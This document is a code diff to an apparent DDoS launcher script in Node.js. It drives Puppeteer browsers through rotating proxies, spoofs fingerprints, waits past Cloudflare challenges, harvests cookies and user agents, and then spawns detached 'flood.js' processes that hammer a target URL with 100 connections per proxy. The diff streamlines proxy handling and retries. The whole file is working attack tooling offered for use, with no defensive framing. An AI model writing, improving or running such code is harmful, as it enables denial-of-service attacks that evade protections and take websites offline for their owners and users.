@@ -119,73 +119,21 @@ async function spoofFingerprint(page) {
   });
 }
 
-// Test if proxy is alive first
-async function testProxy(proxyUrl, timeout = 10000) {
-  return new Promise((resolve) => {
-    const http = require('http');
-    const https = require('https');
-    
-    const url = proxyUrl.startsWith('https') ? proxyUrl.replace('https', 'http') : proxyUrl;
-    const [host, port] = url.replace('http://', '').split(':');
-    
-    const options = {
-      host: host,
-      port: parseInt(port),
-      method: 'CONNECT',
-      path: 'sugbo.ph:443',
-      timeout: timeout
-    };
-    
-    const req = http.request(options);
-    req.on('connect', (res, socket) => {
-      socket.destroy();
-      resolve(true);
-    });
-    req.on('error', () => resolve(false));
-    req.on('timeout', () => {
-      req.destroy();
-      resolve(false);
-    });
-    req.end();
-  });
-}
-
-// Main browser function
+// Main browser function - FIXED for ip:port format
 async function openBrowser(proxy, id) {
   const userAgent = getRandomUA();
   const tempDir = `./temp_profile_${id}_${Date.now()}`;
   
-  // Format proxy correctly
-  let proxyUrl = proxy;
-  let hasAuth = false;
+  // Simple proxy formatting - NO AUTH REQUIRED
+  let proxyUrl = proxy.trim();
   
-  // Check if proxy has authentication
-  if (proxyUrl.includes('@')) {
-    hasAuth = true;
-    // Already in format user:pass@host:port
-    if (!proxyUrl.startsWith('http://') && !proxyUrl.startsWith('https://')) {
-      proxyUrl = `http://${proxyUrl}`;
-    }
-  } else {
-    // No authentication
-    if (!proxyUrl.startsWith('http://') && !proxyUrl.startsWith('https://')) {
-      proxyUrl = `http://${proxyUrl}`;
-    }
-  }
+  // Remove any protocol if present
+  proxyUrl = proxyUrl.replace(/^https?:\/\//, '');
   
-  log("info", `[${id}] Testing connection to proxy: ${proxy.split('@').pop() || proxy}`);
+  // Just add http:// prefix for puppeteer
+  proxyUrl = `http://${proxyUrl}`;
   
-  // Quick proxy test
-  const isAlive = await testProxy(proxyUrl, 10000);
-  if (!isAlive) {
-    log("error", `[${id}] Proxy ${proxy.split('@').pop() || proxy} is not reachable`);
-    return {
-      success: false,
-      proxy: proxy,
-      error: "Proxy not reachable",
-      errorType: "dead_proxy"
-    };
-  }
+  log("info", `[${id}] Using proxy: ${proxyUrl}`);
   
   const options = {
     headless: "new",
@@ -220,7 +168,7 @@ async function openBrowser(proxy, id) {
   let browser = null;
   
   try {
-    log("info", `[${id}] Launching browser with proxy: ${proxy.split('@').pop() || proxy}`);
+    log("info", `[${id}] Launching browser...`);
     
     // Launch browser with timeout
     const browserPromise = puppeteer.launch(options);
@@ -244,22 +192,17 @@ async function openBrowser(proxy, id) {
     
     log("info", `[${id}] Navigating to ${targetURL}`);
     
-    // Navigation with retries for connection reset
+    // Navigation with retries for connection issues
     let navigationSuccess = false;
     let lastError = null;
     let pageContent = null;
     
     for (let attempt = 1; attempt <= 3; attempt++) {
       try {
-        const response = await page.goto(targetURL, {
+        await page.goto(targetURL, {
           waitUntil: 'domcontentloaded',
           timeout: TIMEOUT
         });
-        
-        // Check response status
-        if (response && response.status() >= 400) {
-          log("warn", `[${id}] HTTP ${response.status()} from target`);
-        }
         
         navigationSuccess = true;
         pageContent = await page.content();
@@ -268,41 +211,28 @@ async function openBrowser(proxy, id) {
         
       } catch (navError) {
         lastError = navError;
-        log("warn", `[${id}] Attempt ${attempt}/3 failed: ${navError.message}`);
         
-        // Check for specific errors
-        if (navError.message.includes('ERR_CONNECTION_RESET')) {
-          log("error", `[${id}] Connection reset - proxy unstable`);
-          if (attempt === 3) {
-            await browser.close();
-            try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
-            return {
-              success: false,
-              proxy: proxy,
-              error: "Connection reset - unstable proxy",
-              errorType: "unstable_proxy"
-            };
-          }
+        // Log specific errors without being too strict about auth
+        if (navError.message.includes('ERR_INVALID_AUTH_CREDENTIALS')) {
+          log("warn", `[${id}] Attempt ${attempt}/3: Proxy may require auth, continuing anyway...`);
+        } else if (navError.message.includes('ERR_TUNNEL_CONNECTION_FAILED')) {
+          log("warn", `[${id}] Attempt ${attempt}/3: Tunnel failed - proxy might be slow or dead`);
+        } else if (navError.message.includes('ERR_CONNECTION_RESET')) {
+          log("warn", `[${id}] Attempt ${attempt}/3: Connection reset - proxy unstable`);
         } else if (navError.message.includes('ERR_TIMED_OUT')) {
-          log("error", `[${id}] Timeout - proxy too slow`);
-        } else if (navError.message.includes('ERR_INVALID_AUTH')) {
-          log("error", `[${id}] Authentication failed - proxy needs user:pass`);
-          await browser.close();
-          try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
-          return {
-            success: false,
-            proxy: proxy,
-            error: "Authentication required",
-            errorType: "auth_required"
-          };
+          log("warn", `[${id}] Attempt ${attempt}/3: Timeout - proxy slow`);
+        } else {
+          log("warn", `[${id}] Attempt ${attempt}/3: ${navError.message}`);
         }
         
         if (attempt < 3) {
-          await sleep(5000); // Wait longer between retries
-          // Reload page if browser still works
+          await sleep(4000);
+          // Try to reload the page
           try {
             await page.reload({ timeout: 30000 });
-          } catch(e) {}
+          } catch(e) {
+            // Ignore reload errors
+          }
         }
       }
     }
@@ -314,41 +244,21 @@ async function openBrowser(proxy, id) {
     // Check for Cloudflare challenge
     if (pageContent && (pageContent.includes("challenge-platform") || pageContent.includes("cf-browser-verification") || pageContent.includes("Just a moment"))) {
       log("pink", `[${id}] Cloudflare challenge detected - waiting for bypass`);
-      await sleep(10000); // Wait longer for Cloudflare
-      
-      // Check again after waiting
-      const newContent = await page.content();
-      if (newContent.includes("Just a moment")) {
-        log("error", `[${id}] Cloudflare block persistent - proxy flagged`);
-        await browser.close();
-        try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
-        return {
-          success: false,
-          proxy: proxy,
-          error: "Cloudflare block detected",
-          blocked: true
-        };
-      }
+      await sleep(8000);
     }
     
     // Get page info
     const title = await page.title();
     const currentUrl = page.url();
     
-    log("success", `[${id}] Loaded: ${title} (${currentUrl})`);
+    log("success", `[${id}] ✅ Loaded: ${title}`);
     
     // Get cookies
     const cookies = await page.cookies();
     let cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
     
-    // If no cookies found, try localStorage
     if (!cookieString) {
-      const localStorage = await page.evaluate(() => {
-        return JSON.stringify(window.localStorage);
-      });
-      if (localStorage && localStorage !== '{}') {
-        cookieString = `localStorage=${Buffer.from(localStorage).toString('base64')}`;
-      }
+      cookieString = "no-cookies-found";
     }
     
     // Check if flood.js exists
@@ -364,20 +274,18 @@ async function openBrowser(proxy, id) {
     }
     
     // Spawn flood.js process
-    log("success", `[${id}] ✅ Spawning flood.js with proxy: ${proxy.split('@').pop() || proxy}`);
+    log("success", `[${id}] 🚀 Spawning flood.js with proxy: ${proxy}`);
     
     const floodArgs = [
       "flood.js",
       targetURL,
-      "100",        // connections
-      "2",          // threads
-      proxy,        // proxy (keep original format)
-      rates,        // rate
-      cookieString, // cookies
-      userAgent     // user agent
+      "100",
+      "2",
+      proxy,
+      rates,
+      cookieString,
+      userAgent
     ];
-    
-    log("info", `[${id}] Command: node ${floodArgs.slice(0, 5).join(' ')} ...`);
     
     // Spawn flood.js process detached
     const floodProcess = spawn("node", floodArgs, {
@@ -388,7 +296,7 @@ async function openBrowser(proxy, id) {
     
     floodProcess.unref();
     
-    log("success", `[${id}] flood.js started with PID: ${floodProcess.pid}`);
+    log("success", `[${id}] flood.js PID: ${floodProcess.pid}`);
     
     // Close browser
     await browser.close();
@@ -402,8 +310,6 @@ async function openBrowser(proxy, id) {
       success: true,
       proxy: proxy,
       title: title,
-      cookies: cookieString.substring(0, 200) + "...",
-      userAgent: userAgent,
       pid: floodProcess.pid
     };
     
@@ -419,18 +325,10 @@ async function openBrowser(proxy, id) {
       fs.rmSync(tempDir, { recursive: true, force: true });
     } catch(e) {}
     
-    // Determine error type
-    let errorType = "unknown";
-    if (error.message.includes('ERR_CONNECTION_RESET')) errorType = "connection_reset";
-    if (error.message.includes('ERR_TIMED_OUT')) errorType = "timeout";
-    if (error.message.includes('ERR_INVALID_AUTH')) errorType = "auth_error";
-    if (error.message.includes('ECONNREFUSED')) errorType = "connection_refused";
-    
     return {
       success: false,
       proxy: proxy,
-      error: error.message,
-      errorType: errorType
+      error: error.message
     };
   }
 }
@@ -439,11 +337,14 @@ async function openBrowser(proxy, id) {
 async function worker(proxy, id, retries = 0) {
   const result = await openBrowser(proxy, id);
   
-  // Don't retry certain error types
-  const noRetryErrors = ['auth_required', 'dead_proxy', 'connection_refused'];
+  // Retry on certain errors
+  const shouldRetry = !result.success && retries < MAX_RETRIES && 
+                     (result.error.includes('ERR_TUNNEL_CONNECTION_FAILED') || 
+                      result.error.includes('ERR_CONNECTION_RESET') ||
+                      result.error.includes('ERR_TIMED_OUT'));
   
-  if (!result.success && retries < MAX_RETRIES && !noRetryErrors.includes(result.errorType)) {
-    log("warn", `[${id}] Retry ${retries + 1}/${MAX_RETRIES} for ${proxy.split('@').pop() || proxy}`);
+  if (shouldRetry) {
+    log("warn", `[${id}] Retry ${retries + 1}/${MAX_RETRIES}`);
     await sleep(3000);
     return worker(proxy, id, retries + 1);
   }
@@ -451,30 +352,47 @@ async function worker(proxy, id, retries = 0) {
   return result;
 }
 
-// Store flood processes for tracking
-const floodProcesses = [];
+// Global stats
+let successCount = 0;
+let failCount = 0;
+let totalCompleted = 0;
 
-// Kill all flood.js processes on exit
+// Process function
+async function processProxy(proxy, id) {
+  const result = await worker(proxy, id);
+  totalCompleted++;
+  
+  if (result.success) {
+    successCount++;
+    log("success", `[${id}] ✅ SUCCESS (${successCount}/${totalCompleted}) - Proxy: ${proxy}`);
+  } else {
+    failCount++;
+    log("error", `[${id}] ❌ FAILED (${failCount}/${totalCompleted}) - Proxy: ${proxy} | ${result.error}`);
+  }
+  
+  // Process next proxy if available
+  if (proxyQueue.length > 0) {
+    const nextProxy = proxyQueue.shift();
+    if (nextProxy) {
+      processProxy(nextProxy, id + threads);
+    }
+  }
+}
+
+// Proxy queue
+let proxyQueue = [];
+
+// Cleanup function
 function cleanup() {
-  log("warn", "Cleaning up flood.js processes...");
+  log("warn", "Cleaning up...");
   
   if (process.platform === 'win32') {
     const { exec } = require('child_process');
-    exec('taskkill /F /IM node.exe /FI "WINDOWTITLE eq flood.js"', (err) => {
-      if (err && err.code !== 1) {
-        log("error", `Error killing flood.js: ${err.message}`);
-      }
-    });
+    exec('taskkill /F /IM node.exe /FI "WINDOWTITLE eq flood.js"', () => {});
   } else {
     const { exec } = require('child_process');
-    exec('pkill -f flood.js', (err) => {
-      if (err && err.code !== 1) {
-        log("error", `Error killing flood.js: ${err.message}`);
-      }
-    });
+    exec('pkill -f flood.js', () => {});
   }
-  
-  log("success", "Cleanup complete");
 }
 
 // Main function
@@ -484,137 +402,60 @@ async function main() {
   log("info", `╚════════════════════════════════════════╝`);
   log("info", `Target: ${targetURL}`);
   log("info", `Threads: ${threads}`);
-  log("info", `Rate: ${rates} req/sec`);
   log("info", `Duration: ${duration} seconds`);
   log("info", `Total proxies: ${proxies.length}`);
   
   // Check if flood.js exists
   if (!fs.existsSync("flood.js")) {
-    log("error", "flood.js not found in current directory!");
-    log("error", "Make sure flood.js exists before running this script");
+    log("error", "flood.js not found!");
     process.exit(1);
   }
   
-  // Shuffle proxies for better distribution
+  // Shuffle proxies
   for (let i = proxies.length - 1; i > 0; i--) {
     const j = Math.floor(Math.random() * (i + 1));
     [proxies[i], proxies[j]] = [proxies[j], proxies[i]];
   }
   
-  // Create a queue of proxies
-  const proxyQueue = [...proxies];
-  let activeThreads = 0;
-  let completed = 0;
-  let successCount = 0;
-  let failCount = 0;
-  let blockedCount = 0;
-  let unstableCount = 0;
+  proxyQueue = [...proxies];
   
-  // Process function
-  async function processProxy(proxy, id) {
-    activeThreads++;
-    const result = await worker(proxy, id);
-    activeThreads--;
-    completed++;
-    
-    if (result.success) {
-      successCount++;
-      if (result.pid) floodProcesses.push(result.pid);
-      log("success", `[${id}] ✅ SUCCESS - Proxy: ${proxy.split('@').pop() || proxy} | flood.js PID: ${result.pid}`);
-    } else if (result.blocked) {
-      blockedCount++;
-      log("error", `[${id}] 🚫 CLOUDFLARE BLOCK - Proxy: ${proxy.split('@').pop() || proxy}`);
-    } else if (result.errorType === "unstable_proxy" || result.errorType === "connection_reset") {
-      unstableCount++;
-      log("error", `[${id}] ⚠ UNSTABLE PROXY - ${proxy.split('@').pop() || proxy} | ${result.error}`);
-    } else {
-      failCount++;
-      log("error", `[${id}] ❌ FAILED - Proxy: ${proxy.split('@').pop() || proxy} | ${result.error}`);
-    }
-    
-    // Log progress every 5 proxies
-    if (completed % 5 === 0 || completed === proxies.length) {
-      const successRate = ((successCount / completed) * 100).toFixed(1);
-      log("info", `📊 Progress: ${completed}/${proxies.length} | ✅ ${successCount} | 🚫 ${blockedCount} | ⚠ ${unstableCount} | ❌ ${failCount} | (${successRate}% success)`);
-    }
-    
-    // Process next proxy if available
-    if (proxyQueue.length > 0) {
-      const nextProxy = proxyQueue.shift();
-      if (nextProxy) {
-        processProxy(nextProxy, id + threads);
-      }
-    }
-  }
-  
-  // Set up cleanup on exit
+  // Set up cleanup
   process.on('SIGINT', () => {
-    log("warn", "\n⚠ Interrupt received, cleaning up...");
+    log("warn", "\nInterrupt received, cleaning up...");
     cleanup();
-    setTimeout(() => {
-      log("success", "Goodbye!");
-      process.exit(0);
-    }, 2000);
+    setTimeout(() => process.exit(0), 2000);
   });
   
   // Start initial threads
-  const startTime = Date.now();
   for (let i = 0; i < Math.min(threads, proxyQueue.length); i++) {
     const proxy = proxyQueue.shift();
     processProxy(proxy, i + 1);
   }
   
-  // Wait for duration or completion
-  log("info", `⏱ Running for ${duration} seconds...`);
+  // Wait for duration
+  log("info", `Running for ${duration} seconds...`);
+  await sleep(duration * 1000);
   
-  const endTime = startTime + (duration * 1000);
-  const interval = setInterval(() => {
-    const remaining = Math.ceil((endTime - Date.now()) / 1000);
-    if (remaining % 10 === 0 && remaining > 0) {
-      log("info", `⏱ Time remaining: ${remaining} seconds`);
-    }
-  }, 10000);
-  
-  // Wait until duration expires or all proxies processed
-  while (Date.now() < endTime && (proxyQueue.length > 0 || activeThreads > 0)) {
-    await sleep(1000);
-  }
-  
-  clearInterval(interval);
-  
-  // Stop and cleanup
-  log("warn", "\n⏱ Time limit reached or all proxies processed, stopping...");
+  // Cleanup
+  log("warn", "Time limit reached, stopping...");
   cleanup();
   
-  // Wait for cleanup
-  await sleep(3000);
+  await sleep(2000);
   
-  // Final statistics
+  // Final stats
   log("info", "\n╔════════════════════════════════════════╗");
   log("info", "║           FINAL RESULTS                ║");
   log("info", "╚════════════════════════════════════════╝");
-  log("success", `Total proxies tested: ${completed}`);
-  log("success", `✅ Successful (flood.js spawned): ${successCount}`);
-  log("error", `🚫 Blocked by Cloudflare: ${blockedCount}`);
-  log("error", `⚠ Unstable/Connection Reset: ${unstableCount}`);
-  log("error", `❌ Failed (other errors): ${failCount}`);
-  log("success", `📈 Success rate: ${((successCount / completed) * 100).toFixed(2)}%`);
-  
-  if (successCount > 0) {
-    log("success", `🎯 ${successCount} flood.js processes were spawned successfully`);
-  } else {
-    log("error", "💀 No successful connections! You need better quality proxies.");
-    log("error", "Tips:");
-    log("error", "  - Use residential proxies instead of datacenter");
-    log("error", "  - Avoid free proxies (they're mostly dead)");
-    log("error", "  - Check proxy format: ip:port or user:pass@ip:port");
-  }
+  log("success", `Total tested: ${totalCompleted}`);
+  log("success", `✅ Successful: ${successCount}`);
+  log("error", `❌ Failed: ${failCount}`);
+  log("success", `📈 Success rate: ${((successCount / totalCompleted) * 100).toFixed(2)}%`);
   
   process.exit(0);
 }
 
-// Run main function
+// Run
 main().catch(error => {
-  log("error", `Fatal error: ${error.message}`);
+  log("error", `Fatal: ${error.message}`);
   process.exit(1);
 });
